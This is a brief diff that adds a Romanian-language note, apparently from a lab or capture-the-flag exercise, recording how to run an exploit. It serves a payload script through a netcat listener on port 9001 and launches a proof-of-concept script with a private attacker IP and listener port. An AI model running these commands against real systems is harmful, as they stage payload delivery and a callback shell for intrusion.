@@ -1,0 +1,8 @@
+din folderu asta:
+
+
+cat exp_sh.sh | nc -lvnp 9001    ---- pentru automatizare
+
+pentru exploit:
+
+python3 poc.py --userip 192.168.195.129 --webport 8000 --lport 9001
